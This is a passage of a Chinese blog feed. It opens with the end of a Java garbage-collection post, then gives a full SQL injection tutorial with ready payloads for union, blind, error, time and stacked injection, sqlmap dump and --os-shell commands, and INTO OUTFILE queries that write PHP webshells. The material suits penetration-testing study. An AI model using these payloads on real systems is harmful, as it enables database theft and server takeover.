&lt;p&gt;但是，即使这样，Java也还是存在着内存泄漏的情况，java导致内存泄露的原因很明确：长生命周期的对象持有短生命周期对象的引用就很可能发生内存泄露，尽管短生命周期对象已经不再需要，但是因为长生命周期对象持有它的引用而导致不能被回收，这就是java中内存泄露的发生场景。&lt;/p&gt;

&lt;h1 id=&quot;java垃圾回收机制&quot;&gt;Java垃圾回收机制&lt;/h1&gt;

&lt;p&gt;在java中，程序员是不需要显示的去释放一个对象的内存的，而是由虚拟机自行执行。在JVM中，有一个垃圾回收线程，它是低优先级的，在正常情况下是不会执行的，只有在虚拟机空闲或者当前堆内存不足时，才会触发执行，扫面那些没有被任何引用的对象，并将它们添加到要回收的集合中，进行回收。&lt;/p&gt;

&lt;h1 id=&quot;gc&quot;&gt;GC&lt;/h1&gt;

&lt;p&gt;GC 是垃圾收集的意思（Gabage Collection）,内存处理是编程人员容易出现问题的地方，忘记或者错误的内存&lt;/p&gt;

&lt;p&gt;回收会导致程序或系统的不稳定甚至崩溃，Java 提供的 GC 功能可以自动监测对象是否超过作用域从而达到自动&lt;/p&gt;

&lt;p&gt;回收内存的目的，Java 语言没有提供释放已分配内存的显示操作方法&lt;/p&gt;

&lt;h1 id=&quot;垃圾回收的优点和原理&quot;&gt;垃圾回收的优点和原理&lt;/h1&gt;

&lt;p&gt;java语言最显著的特点就是引入了垃圾回收机制，它使java程序员在编写程序时不再考虑内存管理的问题。&lt;/p&gt;

&lt;p&gt;由于有这个垃圾回收机制，java中的对象不再有“作用域”的概念，只有引用的对象才有“作用域”。&lt;/p&gt;

&lt;p&gt;垃圾回收机制有效的防止了内存泄露，可以有效的使用可使用的内存。&lt;/p&gt;

&lt;p&gt;垃圾回收器通常作为一个单独的低级别的线程运行，在不可预知的情况下对内存堆中已经死亡的或很长时间没有用过的对象进行清除和回收。&lt;/p&gt;

&lt;p&gt;程序员不能实时的对某个对象或所有对象调用垃圾回收器进行垃圾回收。&lt;/p&gt;

&lt;p&gt;垃圾回收有分代复制垃圾回收、标记垃圾回收、增量垃圾回收。&lt;/p&gt;

&lt;h1 id=&quot;垃圾回收器的基本原理&quot;&gt;垃圾回收器的基本原理&lt;/h1&gt;

&lt;p&gt;对于GC来说，当程序员创建对象时，GC就开始监控这个对象的地址、大小以及使用情况。&lt;/p&gt;

&lt;p&gt;通常，GC采用有向图的方式记录和管理堆(heap)中的所有对象。通过这种方式确定哪些对象是”可达的”，哪些对象是”不可达的”。当GC确定一些对象为”不可达”时，GC就有责任回收这些内存空间。&lt;/p&gt;

&lt;p&gt;可以。程序员可以手动执行System.gc()，通知GC运行，但是Java语言规范并不保证GC一定会执行。&lt;/p&gt;

&lt;h1 id=&quot;java引用类型&quot;&gt;Java引用类型&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;强引用：发生 gc 的时候不会被回收。&lt;/li&gt;
  &lt;li&gt;软引用：有用但不是必须的对象，在发生内存溢出之前会被回收。&lt;/li&gt;
  &lt;li&gt;弱引用：有用但不是必须的对象，在下一次GC时会被回收。&lt;/li&gt;
  &lt;li&gt;虚引用（幽灵引用/幻影引用）：无法通过虚引用获得对象，用 PhantomReference 实现虚引用，虚引用的用途是在 gc 时返回一个通知&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;判断对象是否可以被回收&quot;&gt;判断对象是否可以被回收&lt;/h1&gt;

&lt;p&gt;垃圾收集器在做垃圾回收的时候，首先需要判定的就是哪些内存是需要被回收的，哪些对象是「存活」的，是不可以被回收的；哪些对象已经「死掉」了，需要被回收&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;引用计数器法：为每个对象创建一个引用计数，有对象引用时计数器 +1，引用被释放时计数 -1，当计数器为 0 时就可以被回收。它有一个缺点不能解决循环引用的问题；&lt;/li&gt;
  &lt;li&gt;可达性分析算法：从 GC Roots 开始向下搜索，搜索所走过的路径称为引用链。当一个对象到 GC Roots 没有任何引用链相连时，则证明此对象是可以被回收的。&lt;/li&gt;
&lt;/ul&gt;</content><author><name></name></author><category term="jvm" /><summary type="html">[toc]</summary></entry><entry><title type="html">sql注入</title><link href="http://localhost:4000/_posts/2020-07-16-sql%E6%B3%A8%E5%85%A5/" rel="alternate" type="text/html" title="sql注入" /><published>2020-07-16T00:00:00-04:00</published><updated>2020-07-16T00:00:00-04:00</updated><id>http://localhost:4000/_posts/sql%E6%B3%A8%E5%85%A5</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-16-sql%E6%B3%A8%E5%85%A5/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;sql注入原理&quot;&gt;SQL注入原理&lt;/h1&gt;

&lt;p&gt;SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。（从客户端提交特殊的代码，从而收集程序及服务器的信息，从而获取你想到得到的资料）&lt;/p&gt;

&lt;h1 id=&quot;sql注入的位置&quot;&gt;&lt;strong&gt;SQL注入的位置&lt;/strong&gt;&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;表单提交，主要是POST请求，也包括GET请求；&lt;/li&gt;
  &lt;li&gt;URL参数提交，主要为GET请求参数；&lt;/li&gt;
  &lt;li&gt;Cookie参数提交；&lt;/li&gt;
  &lt;li&gt;HTTP请求头部的一些可修改的值，比如Referer、User_Agent等；&lt;/li&gt;
  &lt;li&gt;一些边缘的输入点，比如.mp3文件的一些文件信息等。&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;sql注入漏洞常见类型&quot;&gt;SQL注入漏洞常见类型&lt;/h1&gt;

&lt;h2 id=&quot;union注入攻击&quot;&gt;union注入攻击&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;判断是get型还是post型注入；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;找到正确的闭合规则；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;order by 查询字段数；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;union select 1,2…..查看显示位是第几位，没有的话就试试把id=1的显示位让出来，让其等于id=-1；&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/img/sqli.png&quot; alt=&quot;sqli&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;二、三位显示出来了，那么即可在这两个位置写入sql语句；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;查询当前数据库,当前mysql用户 union select 1,user(),database()；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;查询当前数据库里面的表 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=”data_name”;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;查询到敏感表名user，继续查询表里面的字段 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=”user”;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;查询字段，例如“id”、”passwd”的内容 union select 1,id,passwd from user;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;拿到用户、密码登入后台。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;boolean注入攻击-布尔盲注&quot;&gt;Boolean注入攻击-布尔盲注&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;查看现象，能报错，但没有报错信息，正确查询也显示不了查询内容就属于布尔盲注，只存在两种状态，对或错；&lt;/li&gt;
  &lt;li&gt;由页面的两种不同返回的状态来判定我们的闭合规则；&lt;/li&gt;
  &lt;li&gt;为了方便，我们这里假设返回正确用“yes”，返回错误用“no”来表示这两种状态&lt;/li&gt;
  &lt;li&gt;找到闭合规则后，我们在闭合规则里面 and 1=1 和 and 1=2 测试一下，看看最后返回是不是两种状态；&lt;/li&gt;
  &lt;li&gt;布尔盲注要用到length()和substr()语句，用两种状态来猜解数据库、表名等的长度和正确字母；&lt;/li&gt;
  &lt;li&gt;先用 and length(database())&amp;gt;2 来猜数据库的长度，使用的是二分法；&lt;/li&gt;
  &lt;li&gt;再用 and substr(database(),1,1)=’t’ 来确定第一个字母，可用burp跑，26个字母,哪个字母返回yes则代表第一个字母就是它；&lt;/li&gt;
  &lt;li&gt;and substr(database(),2,1)=’t’ 代表当前数据库的第二个字母；&lt;/li&gt;
  &lt;li&gt;最后结合长度，成功的将数据库猜解出来；&lt;/li&gt;
  &lt;li&gt;后面的操作跟union注入的步骤差不多了，只是sql语句写在 上文的 database() 处。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;报错注入攻击&quot;&gt;报错注入攻击&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;只要注入点有sql报错信息，那么就可以使用报错注入；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;还是一样，引号报错，然后找到闭合规则，页面正常显示，则可以在闭合规则中开始写入报错注入的sql语句；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;updatexml报错获取当前数据库：&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;and updatexml(1,concat(0x7e,(select database()),0x7e),1)
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;floor报错获取当前数据库&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;and (select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a)
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;两种方式都可行，如果第一个不行就试试第二个&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;接着可以利用select语句替换掉上面database()来继续获取数据库中的表名、字段名，查询语句和union注入攻击的语句相同；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;只不过这里不能再使用group_concat了，因为报错注入只显示一条结果，所以需要使用limit语句；&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;时间注入攻击-时间盲注&quot;&gt;时间注入攻击-时间盲注&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;没有明确的现象，不管是对是错都返回一个状态；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;但是如果用sleep(5)方法，能让响应时间延迟为5秒以上，那么就为时间盲注；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;我们用sleep(5)函数构造了一个时间延时的状态，因此，我们又有了两种状态，像布尔盲注一样可以根据这两种状态来判定数据库、表名和字段名的长度和正确的每个字母；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;同样的找到正确的闭合规则，当然，这个闭合规则得配合着 and sleep(5)语句来构造，哪一个闭合规则执行了sleep(5)，那么就是正确得闭合规则；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;时间盲注配合着 if(A,B,C) 语句结合使用，含义是：如果A是 true，则返回B（也就是执行B），否则返回C（执行C）；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;那么判断当前数据库名的长度的语句为：&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;if (length(database())&amp;gt;1,sleep(5),1)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;就是说如果数据库长度大于1，那么响应延时5秒，否则执行select 1(也就是不延时)，由此来推出数据库长度。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;判断当前数据库名的第一个和第二个字母的语句：&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;if(substr(database(),1,1)='s',sleep(5),1)
if(substr(database(),2,1)='s',sleep(5),1)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;只有第一个字母等于26个字母中正确的字母时，才会延时5秒，因此可以通过burp或者sqlmap来跑。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;根据数据库名长度以此内推即可得出完整的数据库的库命、表名、字段名和具体内容。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;堆叠查询注入攻击&quot;&gt;堆叠查询注入攻击&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;可以使用堆叠注入的地方也可以使用布尔盲注与时间盲注；&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;同样先找出正确的闭合规则，然后也看两种状态来猜解库名、表名等；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;堆叠注入的语句为&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;;select if(length(database())&amp;gt;1,sleep(3),1)
;select if(substr(database(),1,1)='r',sleep(3),1)
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;按照原理来说，分号后面可以执行新sql语句，但是很多时候没必要，如果遇到其他注入方法（或者绕过方式）不行的情况下可以试试这个注入方式；不是很常用。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;二次注入攻击&quot;&gt;二次注入攻击&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;二次注入一共有两个url，url一用来注入，也就是注入点，插入sql语句的地方，另外一个url用来返回信息；&lt;/li&gt;
  &lt;li&gt;也就是url一插入了sql语句，url一的响应里面就会返回这条信息对应的id值，然后url二就传入这个新id值，然后访问，响应回来之后将会爆出sql语句查询的结果，正确或者错误的sql信息；&lt;/li&gt;
  &lt;li&gt;就相当于url是一个用户注册的地方，用户注册后会在数据库里面加入新id存放用户的注册信息，那么这个id可以传给url二来访问，url二就可以显示出用户的注册信息，但如果注册信息含义恶意sql语句，url二就会显示出敏感的数据库信息；&lt;/li&gt;
  &lt;li&gt;跟union注入攻击差不多，只是回显的信息需要在另外的url中显示出来了；&lt;/li&gt;
  &lt;li&gt;后面就是union注入攻击的常规操作。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;宽字节注入攻击&quot;&gt;宽字节注入攻击&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;如果遇到单、双引号被转义，变成了反斜杠，导致参数id无法逃逸单引号的包围；&lt;/li&gt;
  &lt;li&gt;一般情况下，此处就不存在sql注入漏洞的；&lt;/li&gt;
  &lt;li&gt;但是如果数据库的编码为GBK时，就可以使用宽字节注入，因此在不知道是否是GBK编码时，都可以尝试去使用宽字节注入；&lt;/li&gt;
  &lt;li&gt;宽字节的格式是在地址后先加一个 %df ，再加单引号，因为反斜杠的编码为%5c，在GBK编码中，%df%5c是繁体字“連”，因此，单引号成功逃逸，爆出sql错误；&lt;/li&gt;
  &lt;li&gt;因此构造闭合规则时，在单引号前面加上 %df 就行了；&lt;/li&gt;
  &lt;li&gt;之后在闭合规则中写入同union注入的一些查询语句就行了；&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;base64注入攻击&quot;&gt;base64注入攻击&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;如果遇到url的参数id的值看起来像base64的，先拿去url解码，然后如果是base64，拿去base64解码，解出来的应该就是id的值（1，2等数字）；&lt;/li&gt;
  &lt;li&gt;那么如果要对这个url进行sql注入测试，就需要对id后面的所有值进行base64编码；&lt;/li&gt;
  &lt;li&gt;注入的方式步骤都是跟union注入一样的，只不过后面的所有值（整个payload）都要进行base64编码后传给url的c参数提交，包括闭合规则。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;http请求头参数注入-cookie注入攻击&quot;&gt;HTTP请求头参数注入-cookie注入攻击&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;抓包对一个url的http请求头的所有参数进行sql注入测试，里面的所有参数都有可能存在注入点，如果响应包出现sql报错，那么测试的这个参数就是注入点；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;常见的http头部注入的参数有：&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-http&quot;&gt;【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;如果测试到cookie参数的时候，响应有报sql错误，那么就是cookie注入攻击；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;和union注入的差别就在于注入点不一样，之后使用union注入的方法即可&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;http请求头参数注入-xff注入攻击&quot;&gt;HTTP请求头参数注入-XFF注入攻击&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;XFF注入即HTTP头部的X-Forwarded-for参数存在sql注入；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;例如测试此参数的值 X-Forwarded-for:127.0.0.1’ 响应有sql报错，那么此处就是注入点；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;之后使用union注入的方法完成即可&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;知道绝对路径的注入&quot;&gt;知道绝对路径的注入&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;如果通过一些方式爆出了网站的根目录，并且知道此站点存在sql注入；&lt;/li&gt;
  &lt;li&gt;猜测此数据库可能有file权限，那么我们就可以使用语句：into outfile 来写shell到网站的根目录下，之后用菜刀连接；&lt;/li&gt;
  &lt;li&gt;如果数据库没有file权限，那么我们用sqlmap的参数 –is-dba 来查看当前数据库的用户是否有管理员权限；&lt;/li&gt;
  &lt;li&gt;如果有管理员权限，我们就可以使用sqlmap里面的参数命令 –os-shell 来上传、反弹shell，最终getshell；&lt;/li&gt;
  &lt;li&gt;如果file、管理员权限都没有，那么另寻思路，日志、缓存写入等。&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&quot;sqlmap&quot;&gt;SQLMAP&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;官网:http://sqlmap.org/&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;help&quot;&gt;HELP&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;➜  ~ sqlmap -h 
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.2.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

Usage: python sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;)
    -g GOOGLEDORK       Process Google dork results as target URLs

  Request:
    These options can be used to specify how to connect to the target URL

    --data=DATA         Data string to be sent through POST
    --cookie=COOKIE     HTTP Cookie header value
    --random-agent      Use randomly selected HTTP User-Agent header value
    --proxy=PROXY       Use a proxy to connect to the target URL
    --tor               Use Tor anonymity network
    --check-tor         Check to see if Tor is used properly

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --dbms=DBMS         Force back-end DBMS to this value

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH    SQL injection techniques to use (default &quot;BEUSTQ&quot;)

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables. Moreover you can run your own SQL statements

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --passwords         Enumerate DBMS users password hashes
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC

  General:
    These options can be used to set some general working parameters

    --batch             Never ask for user input, use the default behavior
    --flush-session     Flush session files for current target

  Miscellaneous:
    --sqlmap-shell      Prompt for an interactive sqlmap shell
    --wizard            Simple wizard interface for beginner users

[!] to see full list of options run with '-hh'

&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;检查注入点&quot;&gt;检查注入点&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sqlmap -u URL
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;爆所有数据库信息&quot;&gt;爆所有数据库信息&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sqlmap -u URL --dbs
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;爆当前数据库信息&quot;&gt;爆当前数据库信息&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sqlmap -u URL --current-db
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;指定库名列出所有表&quot;&gt;指定库名列出所有表&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sqlmap -u URL -D 数据库名称 --tables
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;指定库名表名列出所有字段&quot;&gt;指定库名表名列出所有字段&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sqlmap -u URL -D 数据库名称 -T 表名 --columns
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;指定库名表名字段dump出指定字段&quot;&gt;指定库名表名字段dump出指定字段&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sqlmap -u URL -D 数据库名称 -T 表名 -C 字段...--dump
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;sql注入写webshell&quot;&gt;SQL注入写WebShell&lt;/h1&gt;

&lt;h2 id=&quot;sql写webshell条件&quot;&gt;SQL写WebShell条件&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;在&lt;a href=&quot;https://www.uedbox.com/post/tag/mysql/&quot;&gt;mysql&lt;/a&gt;的配置文件 my.ini 中，&lt;code&gt;secure_file_priv=&quot;c:/wamp64/tmp&quot;&lt;/code&gt; 被注释 或者 ``secure_file_priv` 配置的位置是web目录。&lt;/li&gt;
  &lt;li&gt;未开启全局gpc&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;sql注入点写webshell的5种方式&quot;&gt;SQL注入点写WebShell的5种方式&lt;/h2&gt;

&lt;h3 id=&quot;union-select-后写入&quot;&gt;union select 后写入&lt;/h3&gt;

&lt;p&gt;最常见的写入方式，union select 后跟 into outfile 语句&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;url?id=@ union select 1,2,3,4,'&amp;lt;?php phpinfo() ?&amp;gt;' into outfile 'path/webshell.php'
urlid=@ union select 1,2,3,4,'&amp;lt;?php phpinfo() ?&amp;gt;' into dumpfile 'path/webshell.php'
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;lines-terminated-by-写入&quot;&gt;lines terminated by 写入&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;url?id=1 into outfile 'path/webshell.php' lines terminated by '&amp;lt;?php phpinfo() ?&amp;gt;';
url?id=1 limit 1 into outfile 'path/webshell.php' lines terminated by '&amp;lt;?php phpinfo() ?&amp;gt;';
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;注入原理&quot;&gt;注入原理&lt;/h4&gt;

&lt;p&gt;通过select语句查询的内容写入文件，也就是 &lt;code&gt;1 into outfile 'path/webshell.php'&lt;/code&gt; 这样写的原因，然后利用 &lt;code&gt;lines terminated by&lt;/code&gt; 语句拼接webshell的内容。&lt;code&gt;lines terminated by&lt;/code&gt; 可以理解为 &lt;strong&gt;以每行终止的位置添加 xx 内容&lt;/strong&gt;。&lt;/p&gt;

&lt;h3 id=&quot;lines-starting-by-写入&quot;&gt;lines starting by 写入&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;url?id=1 into outfile 'path/webshell.php' lines starting by '&amp;lt;?php phpinfo() ?&amp;gt;'; 
url?id=1 limit 1 into outfile 'path/webshell.php' lines starting by '&amp;lt;?php phpinfo() ?&amp;gt;';
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;注入原理-1&quot;&gt;注入原理&lt;/h4&gt;

&lt;p&gt;利用 &lt;code&gt;lines starting by&lt;/code&gt; 语句拼接webshell的内容。&lt;code&gt;lines starting by&lt;/code&gt; 可以理解为 &lt;strong&gt;以每行开始的位置添加 xx 内容&lt;/strong&gt;。&lt;/p&gt;

&lt;h3 id=&quot;fields-terminated-by-写入&quot;&gt;fields terminated by 写入&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;url?id=1 into outfile 'path/webshell.php' fields terminated by '&amp;lt;?php phpinfo() ?&amp;gt;'; 
url?id=1 limit 1 into outfile 'path/webshell.php' fields terminated by '&amp;lt;?php phpinfo() ?&amp;gt;';
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;columns-terminated-by-写入&quot;&gt;COLUMNS terminated by 写入&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;url?id=1 into outfile 'path/webshell.php' COLUMNS terminated by '&amp;lt;?php phpinfo() ?&amp;gt;';
url?id=1 limit 1 into outfile 'path/webshell.php' COLUMNS terminated by '&amp;lt;?php phpinfo() ?&amp;gt;';
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;注入原理-2&quot;&gt;注入原理&lt;/h4&gt;

&lt;p&gt;利用 &lt;code&gt;fields terminated by&lt;/code&gt; 语句拼接webshell的内容。&lt;code&gt;fields terminated by&lt;/code&gt; 可以理解为 &lt;strong&gt;以每个字段的位置添加 xx 内容&lt;/strong&gt;。&lt;/p&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry></feed>